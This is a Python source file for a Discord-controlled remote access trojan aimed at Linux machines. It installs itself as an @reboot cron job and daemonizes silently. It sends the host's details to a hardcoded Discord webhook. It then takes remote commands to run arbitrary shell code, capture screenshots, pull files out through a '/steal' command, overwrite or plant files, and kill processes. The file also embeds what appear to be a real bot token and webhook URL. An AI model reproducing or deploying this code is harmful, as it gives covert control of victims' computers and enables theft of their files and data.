import os
import time
import datetime
from typing import Dict, Any
import sys
import platform
import socket
import requests
import discord
import subprocess
import asyncio
import psutil
import glob  # Ensure you have this library installed using pip install psutil

# Bot token (replace with your actual token)
TOKEN = "MTMyMDExNTQ2NjM0MTA2MDY3MA.GnH6F4.CJGuAD6UtH0j0zd3qmDhyMQr3VZCBoRmzfykAc"

# Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1320057002033942610/7tE0LCCdk9d9LO3dejR_OO32gy8VdsynCA2tpHKmuMCRqyxcq2PiaE-dJSn2i4L_yNAu"

# Setting up time
start_time = time.time()

# Intents setup
intents = discord.Intents.default()
intents.message_content = True

# Create the bot client
client = discord.Client(intents=intents)

# Global variable to track the current working directory
current_directory = os.path.expanduser("~")  # Default to the home directory

def setup_cron():
    """Automatically add the script to cron for @reboot."""
    try:
        # Get the current script's path
        script_path = os.path.abspath(__file__)

        # Check if the script is already in the cron list
        cron_jobs = subprocess.run(["crontab", "-l"], stdout=subprocess.PIPE, text=True)
        if script_path in cron_jobs.stdout:
            print("Cron job already exists.")
            return

        # Add the script to the cron job list
        new_cron_job = f"@reboot python3 {script_path}\n"
        if cron_jobs.returncode == 0:  # Existing cron jobs
            updated_cron = cron_jobs.stdout + new_cron_job
        else:  # No existing cron jobs
            updated_cron = new_cron_job

        # Update the cron jobs
        subprocess.run(["crontab", "-"], input=updated_cron, text=True)
        print("Added to cron jobs for @reboot.")
    except Exception as e:
        print(f"Failed to configure cron: {e}")

def get_available_applications():
    """
    Scan the system for available applications by checking common paths
    and desktop entry files.
    """
    available_apps = {}
    
    # Common paths where .desktop files are stored
    desktop_paths = [
        "/usr/share/applications/",
        "/usr/local/share/applications/",
        os.path.expanduser("~/.local/share/applications/")
    ]
    
    for path in desktop_paths:
        if os.path.exists(path):
            for desktop_file in glob.glob(os.path.join(path, "*.desktop")):
                try:
                    with open(desktop_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        
                        # Parse basic .desktop file information
                        name = None
                        exec_cmd = None
                        hidden = False
                        no_display = False
                        
                        for line in content.split('\n'):
                            if line.startswith('Name='):
                                name = line.split('=', 1)[1].strip()
                            elif line.startswith('Exec='):
                                exec_cmd = line.split('=', 1)[1].strip()
                                # Remove field codes (%f, %F, %u, %U, etc.)
                                exec_cmd = exec_cmd.split('%')[0].strip()
                            elif line.startswith('Hidden='):
                                hidden = line.split('=', 1)[1].strip().lower() == 'true'
                            elif line.startswith('NoDisplay='):
                                no_display = line.split('=', 1)[1].strip().lower() == 'true'
                        
                        # Only add if it's a valid, non-hidden application
                        if name and exec_cmd and not hidden and not no_display:
                            # Get the base command (first word of exec)
                            base_cmd = exec_cmd.split()[0]
                            
                            # Check if the command actually exists in PATH
                            if subprocess.run(['which', base_cmd], capture_output=True).returncode == 0:
                                # Use lowercase name as key for case-insensitive lookup
                                key = name.lower()
                                available_apps[key] = {
                                    'name': name,
                                    'command': exec_cmd,
                                    'desktop_file': desktop_file
                                }
                
                except Exception as e:
                    print(f"Error parsing {desktop_file}: {e}")
    
    return available_apps



def get_status_info() -> Dict[str, Any]:
    """Gather comprehensive status information about the system and bot."""
    current_time = time.time()
    uptime = current_time - start_time
    
    status_info = {
        "🤖 Bot Information": {
            "Bot User": str(client.user) if client.user else "Not connected",
            "Bot ID": str(client.user.id) if client.user else "Unknown",
            "Connected Servers": len(client.guilds) if client.guilds else 0,
            "Runtime": str(datetime.timedelta(seconds=int(uptime))),
            "Start Time": datetime.datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S'),
            "Current Directory": current_directory
        },
        "📊 System Resources": {
            "CPU Usage": f"{psutil.cpu_percent()}%",
            "RAM Usage": f"{psutil.virtual_memory().percent}%",
            "Available RAM": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
            "Total RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
            "Disk Usage": f"{psutil.disk_usage('/').percent}%",
            "Available Disk": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
            "Total Disk": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB"
        },
        "🌐 Network Information": {
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "FQDN": socket.getfqdn(),
            "Network Interfaces": {
                iface: [addr.address for addr in addrs if addr.family == socket.AF_INET]
                for iface, addrs in psutil.net_if_addrs().items()
            }
        },
        "⚙️ Process Information": {
            "Process ID": os.getpid(),
            "Parent Process": os.getppid(),
            "Process Priority": psutil.Process().nice(),
            "Thread Count": psutil.Process().num_threads(),
            "Open Files": len(psutil.Process().open_files()),
            "Active Connections": len(psutil.Process().connections())
        },
        "🐍 Python Environment": {
            "Python Version": platform.python_version(),
            "Python Implementation": platform.python_implementation(),
            "Discord.py Version": discord.__version__,
            "Working Directory": os.getcwd(),
            "Script Location": os.path.abspath(__file__),
            "Command Line": " ".join(sys.argv)
        },
        "💻 System Details": {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "OS Release": platform.release(),
            "Architecture": platform.machine(),
            "Processor": platform.processor(),
            "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        }
    }
    return status_info

def get_device_info():
    """Collect comprehensive device information."""
    try:
        # Basic system information
        device_info = {
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "fqdn": socket.getfqdn(),
            "os": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "machine": platform.machine(),
        }
        
        # Disk information
        disk_usage = psutil.disk_usage('/')
        device_info.update({
            "total_disk": f"{disk_usage.total / (1024 ** 3):.2f} GB",
            "used_disk": f"{disk_usage.used / (1024 ** 3):.2f} GB",
            "free_disk": f"{disk_usage.free / (1024 ** 3):.2f} GB",
            "disk_usage_percent": f"{disk_usage.percent}%",
        })
        
        # Memory information
        memory = psutil.virtual_memory()
        device_info.update({
            "total_memory": f"{memory.total / (1024 ** 3):.2f} GB",
            "used_memory": f"{memory.used / (1024 ** 3):.2f} GB",
            "free_memory": f"{memory.available / (1024 ** 3):.2f} GB",
            "memory_usage_percent": f"{memory.percent}%",
        })
        
        # CPU information
        device_info.update({
            "cpu_count": psutil.cpu_count(logical=True),
            "cpu_physical_cores": psutil.cpu_count(logical=False),
            "cpu_frequency": f"{psutil.cpu_freq().current:.2f} MHz",
            "cpu_usage_percent": f"{psutil.cpu_percent(interval=1)}%",
        })

        # Network information
        net_if_addrs = psutil.net_if_addrs()
        net_info = {
            iface: [addr.address for addr in addrs if addr.family == socket.AF_INET]
            for iface, addrs in net_if_addrs.items()
        }
        device_info["network_interfaces"] = net_info

        # Uptime
        uptime_seconds = int(psutil.boot_time())
        device_info["uptime"] = f"{uptime_seconds // 3600}h {(uptime_seconds % 3600) // 60}m"

        return device_info

    except Exception as e:
        print(f"Error gathering device information: {e}")
        return {"error": str(e)}

# Example usage in the webhook notification
def send_webhook_notification():
    """Send a notification to the Discord webhook."""
    device_info = get_device_info()
    content = "**💻 Device Connected**\n"
    for key, value in device_info.items():
        content += f"**{key.replace('_', ' ').title()}:** `{value}`\n"

    try:
        response = requests.post(
            WEBHOOK_URL,
            json={"content": content},
            headers={"Content-Type": "application/json"},
        )
        if response.status_code == 204:
            print("Webhook notification sent successfully.")
        else:
            print(f"Failed to send webhook notification: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Error sending webhook notification: {e}")

@client.event
async def on_ready():
    print(f'✅ Bot is logged in as {client.user} and ready!')

@client.event
async def on_message(message):
    global current_directory  # Access the global variable

    # Ignore the bot's own messages
    if message.author == client.user:
        return

    # Helper function to send styled messages
    async def send_embed(title, description, color=discord.Color.blue()):
        embed = discord.Embed(title=title, description=description, color=color)
        await message.channel.send(embed=embed)

    # Screenshot command
    if message.content.strip() == "/screenshot":
        try:
            os.environ["DISPLAY"] = ":0"
            screenshot_path = os.path.join(current_directory, "screenshot.png")
            subprocess.run(["scrot", screenshot_path], check=True)

            with open(screenshot_path, "rb") as file:
                await message.channel.send("📸 **Screenshot Captured:**", file=discord.File(file))
            os.remove(screenshot_path)
        except subprocess.CalledProcessError as e:
            await send_embed("Error", f"Failed to take screenshot: {str(e)}", discord.Color.red())
        except Exception as e:
            await send_embed("Error", f"An unexpected error occurred: {str(e)}", discord.Color.red())

    # Alert command
    elif message.content.startswith("/alert"):
        parts = message.content.split(maxsplit=1)
        if len(parts) > 1:
            alert_message = parts[1]
            try:
                subprocess.run(["zenity", "--info", "--text", alert_message, "--width=300", "--height=100"], check=True)
                await send_embed("✅ Alert Displayed", f"Message: `{alert_message}`")
            except Exception as e:
                await send_embed("Error", f"Failed to display alert: {str(e)}", discord.Color.red())
        else:
            await send_embed("Usage", "`/alert [message]`")

    # Execute shell commands in the current directory
    elif message.content.startswith("cmd:"):
        command = message.content[4:].strip()
        await send_embed("Executing Command", f"```{command}```")
        try:
            result = subprocess.run(
                command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_directory
            )
            output = result.stdout or result.stderr
            await send_embed("Command Output", f"```\n{output[:2000]}```")
        except Exception as e:
            await send_embed("Error", f"Failed to execute command: {str(e)}", discord.Color.red())

    # Change directory
    elif message.content.startswith("/cd"):
        parts = message.content.split(maxsplit=1)
        if len(parts) == 1:
            current_directory = os.path.expanduser("~")
        elif parts[1] == "-":
            current_directory = os.path.dirname(current_directory)
        else:
            new_directory = os.path.join(current_directory, parts[1])
            if os.path.isdir(new_directory):
                current_directory = new_directory
            else:
                await send_embed("Error", f"Directory `{parts[1]}` does not exist.", discord.Color.red())
                return
        await send_embed("Directory Changed", f"Current Directory: `{current_directory}`")

    # Kill a process
    elif message.content.startswith("/kill"):
        parts = message.content.split(maxsplit=1)
        if len(parts) == 1:
            try:
                processes = [
                    f"PID: `{proc.info['pid']}` | Name: `{proc.info['name']}`"
                    for proc in psutil.process_iter(['pid', 'name'])
                ]
                process_list = "\n".join(processes[:20])
                await send_embed("Running Processes", f"{process_list}\n\nUse `/kill [PID]` to terminate a process.")
            except Exception as e:
                await send_embed("Error", f"Failed to list processes: {str(e)}", discord.Color.red())
        else:
            try:
                pid = int(parts[1])
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                await send_embed("✅ Process Terminated", f"Process `{process_name}` (PID: `{pid}`) terminated successfully.")
            except psutil.NoSuchProcess:
                await send_embed("Error", f"No such process with PID `{parts[1]}`.", discord.Color.red())
            except Exception as e:
                await send_embed("Error", f"Failed to terminate process: {str(e)}", discord.Color.red())

    # Show file contents
    elif message.content.startswith("/show"):
        parts = message.content.split(maxsplit=1)
        if len(parts) > 1:
            file_path = os.path.join(current_directory, parts[1])
            if os.path.isfile(file_path):
                try:
                    with open(file_path, "r") as file:
                        content = file.read()
                    await send_embed(f"File Contents: {parts[1]}", f"```\n{content[:2000]}```")
                except Exception as e:
                    await send_embed("Error", f"Failed to read file: {str(e)}", discord.Color.red())
            else:
                await send_embed("Error", f"File `{parts[1]}` does not exist.", discord.Color.red())
        else:
            await send_embed("Usage", "`/show [file]`")

    # Replace file contents
    elif message.content.startswith("/replace"):
        parts = message.content.split(maxsplit=2)
        if len(parts) == 3:
            file_path = os.path.join(current_directory, parts[1])
            new_content = parts[2]
            try:
                with open(file_path, "w") as file:
                    file.write(new_content)
                await send_embed("✅ File Updated", f"Contents of `{parts[1]}` replaced successfully.")
            except Exception as e:
                await send_embed("Error", f"Failed to replace file contents: {str(e)}", discord.Color.red())
        else:
            await send_embed("Usage", "`/replace [file] [new_content]`")

    # Exit the bot
    elif message.content.strip() == "/exit":
        if message.author.guild_permissions.administrator:
            await send_embed("Shutting Down", "The bot is shutting down...")
            await client.close()
            sys.exit(0)
        else:
            await send_embed("Permission Denied", "You do not have permission to use this command.", discord.Color.red())

    # /steal command
    elif message.content.startswith("/steal"):
        parts = message.content.split(maxsplit=1)
        if len(parts) > 1:
            file_path = os.path.join(current_directory, parts[1])
            if os.path.isfile(file_path):
                try:
                    with open(file_path, "rb") as file:
                        await message.channel.send(file=discord.File(file, filename=parts[1]))
                    await send_embed("✅ File Sent", f"File `{parts[1]}` sent successfully.")
                except Exception as e:
                    await send_embed("Error", f"Failed to send file: {str(e)}", discord.Color.red())
            else:
                await send_embed("Error", f"File `{parts[1]}` does not exist.", discord.Color.red())
        else:
            await send_embed("Usage", "`/steal [file]`")

    # /chat command
    elif message.content.startswith("/chat"):
        parts = message.content.split(maxsplit=1)
        if len(parts) > 1:
            reply_message = parts[1]
            await send_embed("Message Sent", f"Message to Chromebook: `{reply_message}`")
        else:
            await send_embed("Usage", "`/chat [message]`")

    # /restart command
    elif message.content.strip() == "/restart":
        await send_embed("Restarting Bot", "The bot is restarting...")
        try:
            subprocess.Popen([sys.executable, os.path.abspath(__file__)] + sys.argv[1:], close_fds=True)
            sys.exit(0)
        except Exception as e:
            await send_embed("Error", f"Failed to restart bot: {str(e)}", discord.Color.red())


    elif message.content.strip() == "/status":
        try:
            status_info = get_status_info()
            
            # Create a formatted status message with enhanced styling
            formatted_status = []
            for category, data in status_info.items():
                formatted_status.append(f"**{category}**")
                if isinstance(data, dict):
                    for key, value in data.items():
                        if isinstance(value, dict):
                            formatted_status.append(f"➤ {key}:")
                            for subkey, subvalue in value.items():
                                formatted_status.append(f"  • {subkey}: `{subvalue}`")
                        else:
                            formatted_status.append(f"➤ {key}: `{value}`")
                else:
                    formatted_status.append(f"➤ `{data}`")
                formatted_status.append("")
            
            # Split the message if it's too long
            status_text = "\n".join(formatted_status)
            if len(status_text) > 2000:
                # Split into multiple messages with consistent styling
                chunks = []
                current_chunk = []
                current_length = 0
                
                for line in formatted_status:
                    if current_length + len(line) + 1 > 1900:  # Leave some margin
                        chunks.append("\n".join(current_chunk))
                        current_chunk = []
                        current_length = 0
                    
                    current_chunk.append(line)
                    current_length += len(line) + 1
                
                if current_chunk:
                    chunks.append("\n".join(current_chunk))
                
                for i, chunk in enumerate(chunks, 1):
                    embed = discord.Embed(
                        title=f"📊 System Status (Part {i}/{len(chunks)})",
                        description=chunk,
                        color=discord.Color.blue()
                    )
                    embed.set_footer(text=f"Requested by {message.author.name} • {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                    await message.channel.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="📊 System Status",
                    description=status_text,
                    color=discord.Color.blue()
                )
                embed.set_footer(text=f"Requested by {message.author.name} • {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                await message.channel.send(embed=embed)
                
        except Exception as e:
            error_embed = discord.Embed(
                title="❌ Error",
                description=f"Failed to get status information: `{str(e)}`",
                color=discord.Color.red()
            )
            await message.channel.send(embed=error_embed)

    elif message.content.strip().startswith("/upload"):
        if message.attachments:
            for attachment in message.attachments:
                file_path = os.path.join(current_directory, attachment.filename)
                try:
                    # Save the attachment to the current directory
                    await attachment.save(file_path)
                    await send_embed("✅ File Uploaded", f"File `{attachment.filename}` saved to `{current_directory}`.")
                except Exception as e:
                    await send_embed("Error", f"Failed to save file `{attachment.filename}`: {str(e)}", discord.Color.red())
        else:
            await send_embed("Usage", "Attach a file with the `/upload` command.")

    elif message.content.startswith("/gui"):
        parts = message.content.split(maxsplit=3)
        
        # Check if enough arguments are provided
        if len(parts) < 3:
            await send_embed("Usage", """
**GUI Command Usage:**
`/gui static [title] [message]` - Display a static message with a close button
`/gui input [title] [message]` - Display an input dialog
`/gui time [seconds] [message]` - Display a message for specified duration

**Examples:**
`/gui static "System Alert" "Backup completed successfully"`
`/gui input "User Input" "Please enter your name:"`
`/gui time 5 "This message will disappear in 5 seconds"`
""")
            return

        gui_type = parts[1].lower()
        
        try:
            if gui_type == "static":
                if len(parts) != 4:
                    await send_embed("Error", "Usage: `/gui static [title] [message]`", discord.Color.red())
                    return
                    
                title, content = parts[2], parts[3]
                cmd = [
                    "zenity", "--info",
                    "--title", title,
                    "--text", content,
                    "--width=400",
                    "--height=150",
                    "--ok-label", "Close",
                    "--window-icon=info"
                ]
                
            elif gui_type == "input":
                if len(parts) != 4:
                    await send_embed("Error", "Usage: `/gui input [title] [message]`", discord.Color.red())
                    return
                    
                title, content = parts[2], parts[3]
                cmd = [
                    "zenity", "--entry",
                    "--title", title,
                    "--text", content,
                    "--width=400",
                    "--window-icon=question"
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    await send_embed("✅ Input Received", f"Response: `{result.stdout.strip()}`")
                return
                
            elif gui_type == "time":
                if len(parts) < 4:
                    await send_embed("Error", "Usage: `/gui time [seconds] [message]`", discord.Color.red())
                    return
                
                try:
                    duration = int(parts[2])
                    content = " ".join(parts[3:])
                    
                    # Create a process that will kill the notification after specified duration
                    cmd = [
                        "zenity", "--info",
                        "--title", "Timed Message",
                        "--text", f"{content}\n\nThis message will close in {duration} seconds",
                        "--width=400",
                        "--height=150",
                        "--window-icon=info"
                    ]
                    
                    process = subprocess.Popen(cmd)
                    await asyncio.sleep(duration)
                    process.terminate()
                    
                except ValueError:
                    await send_embed("Error", "Duration must be a number", discord.Color.red())
                    return
                    
            else:
                await send_embed("Error", "Invalid GUI type. Use `static`, `input`, or `time`.", discord.Color.red())
                return

            if gui_type != "time" and gui_type != "input":
                subprocess.Popen(cmd)
            await send_embed("✅ GUI Displayed", f"Type: `{gui_type}`\nMessage: `{parts[-1]}`")
            
        except Exception as e:
            await send_embed("Error", f"Failed to display GUI: {str(e)}", discord.Color.red())

    elif message.content.startswith("/open"):
        parts = message.content.split(maxsplit=1)
        
        # Get available applications
        apps = get_available_applications()
        
        if len(parts) == 1:
            # Create a formatted list of available applications
            if not apps:
                await send_embed(
                    "📱 Applications",
                    "No applications were found on the system.",
                    discord.Color.red()
                )
                return
            
            # Sort applications by name
            sorted_apps = sorted(apps.values(), key=lambda x: x['name'])
            
            # Create chunks of 20 apps each to avoid Discord's message length limit
            chunk_size = 20
            app_chunks = [sorted_apps[i:i + chunk_size] for i in range(0, len(sorted_apps), chunk_size)]
            
            for i, chunk in enumerate(app_chunks):
                embed = discord.Embed(
                    title=f"📱 Available Applications ({i+1}/{len(app_chunks)})",
                    color=discord.Color.blue()
                )
                
                app_list = []
                for app in chunk:
                    app_list.append(f"• `{app['name']}`")
                
                embed.description = "\n".join(app_list)
                if i == 0:  # Add usage information only to the first embed
                    embed.description += "\n\n**Usage:** `/open [app-name]`"
                    embed.set_footer(text="💡 Tip: Names are case-insensitive")
                
                await message.channel.send(embed=embed)
            return
            
        app_name = parts[1].lower()
        if app_name in apps:
            try:
                # Set the DISPLAY environment variable
                os.environ["DISPLAY"] = ":0"
                
                # Get the command to execute
                command = apps[app_name]['command']
                
                # Start the application in the background
                subprocess.Popen(
                    command.split(),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True
                )
                
                embed = discord.Embed(
                    title="✨ Application Launched",
                    description=f"Successfully opened `{apps[app_name]['name']}`",
                    color=discord.Color.green()
                )
                embed.add_field(
                    name="Command Used",
                    value=f"`{command}`",
                    inline=False
                )
                embed.set_footer(text=f"Launched by {message.author.name} • {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                await message.channel.send(embed=embed)
                
            except Exception as e:
                error_embed = discord.Embed(
                    title="❌ Launch Failed",
                    description=f"Failed to open `{apps[app_name]['name']}`\nError: `{str(e)}`",
                    color=discord.Color.red()
                )
                error_embed.set_footer(text="Please check if the application is installed and working properly")
                await message.channel.send(embed=error_embed)
        else:
            # Find suggestions
            suggestions = []
            for app_key in apps:
                if app_name in app_key or app_key in app_name:
                    suggestions.append(apps[app_key]['name'])
            
            error_msg = f"Application `{parts[1]}` not found in the available list."
            if suggestions:
                error_msg += "\n\nDid you mean:\n" + "\n".join(f"• `{s}`" for s in suggestions[:3])
            
            embed = discord.Embed(
                title="⚠️ Invalid Application",
                description=error_msg + "\n\nUse `/open` to see the list of available applications.",
                color=discord.Color.gold()
            )
            await message.channel.send(embed=embed)

    # Add this in your on_message event
    elif message.content.strip() == "/burp":
        burp_directory = os.path.expanduser("~/BurpSuiteCommunity")
        burp_executable = os.path.join(burp_directory, "BurpSuiteCommunity")

        # Check if the directory and executable exist
        if os.path.exists(burp_directory) and os.path.isfile(burp_executable):
            try:
                # Run Burp Suite
                subprocess.Popen(["./BurpSuiteCommunity"], cwd=burp_directory)
                await send_embed("🎉 Burp Suite Launched", "Burp Suite Community Edition is starting up!", discord.Color.green())
            except Exception as e:
                await send_embed("❌ Error", f"Failed to launch Burp Suite: `{str(e)}`", discord.Color.red())
        else:
            # Inform the user if the directory or executable is missing
            await send_embed(
                "⚠️ Burp Suite Not Found",
                f"Directory `{burp_directory}` or executable `{burp_executable}` does not exist. Please verify your installation.",
                discord.Color.orange()
            )

    # /code command to run VSCode
    elif message.content.strip() == "/code":
        await send_embed("Launching VSCode", "Attempting to start Visual Studio Code...")
        try:
            result = subprocess.run(["code"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                await send_embed("✅ Success", "Visual Studio Code launched successfully!")
            else:
                error_message = result.stderr or "Unknown error occurred."
                await send_embed("Error", f"Failed to launch Visual Studio Code:\n`{error_message}`", discord.Color.red())
        except FileNotFoundError:
            await send_embed("Error", "VSCode is not installed or the `code` command is unavailable.", discord.Color.red())
        except Exception as e:
            await send_embed("Error", f"An unexpected error occurred: `{str(e)}`", discord.Color.red())

    elif message.content.strip() == "/browser":
        burp_directory = os.path.expanduser("~/BurpSuiteCommunity/burpbrowser/131.0.6778.85")
        burp_executable = os.path.join(burp_directory, "chrome")

        # Check if the directory and executable exist
        if os.path.exists(burp_directory) and os.path.isfile(burp_executable):
            try:
                # Run Burp Suite
                subprocess.Popen(["./chrome"], cwd=burp_directory)
                await send_embed("🎉 Browser Launched", "Browser is starting up!", discord.Color.green())
            except Exception as e:
                await send_embed("❌ Error", f"Failed to launch Browser `{str(e)}`", discord.Color.red())
        else:
            # Inform the user if the directory or executable is missing
            await send_embed(
                "⚠️ Burp Suite Not Found",
                f"Directory `{burp_directory}` or executable `{burp_executable}` does not exist. Please verify your installation.",
                discord.Color.orange()
            )

    elif message.content.startswith("/link"):
        partso = message.content.split(maxsplit=1)
        if len(partso) > 1:
            link = partso[1].strip()
            if link.startswith("http://") or link.startswith("https://"):
                try:
                    subprocess.run(["xdg-open", link], check=True)
                    await send_embed("🌐 Link Opened", f"The link `{link}` was opened successfully.")
                except subprocess.CalledProcessError as e:
                    await send_embed("Error", f"Failed to open link: `{str(e)}`", discord.Color.red())
                except Exception as e:
                        await send_embed("Error", f"An unexpected error occurred: `{str(e)}`", discord.Color.red())
            else:
                await send_embed("Error", "The link must start with `http://` or `https://`.", discord.Color.red())
        else:
            await send_embed("Usage", "`/link [url]`\nExample: `/link https://google.com`")



# Daemonize the script (optional)
def daemonize():
    if os.fork():
        sys.exit(0)
    os.setsid()
    if os.fork():
        sys.exit(0)
    sys.stdout = open('/dev/null', 'w')
    sys.stderr = open('/dev/null', 'w')
    sys.stdin = open('/dev/null', 'r')

if __name__ == "__main__":
    setup_cron()
    if len(sys.argv) == 1 or sys.argv[1] != "--no-daemon":
        daemonize()
    send_webhook_notification()
    client.run(TOKEN)
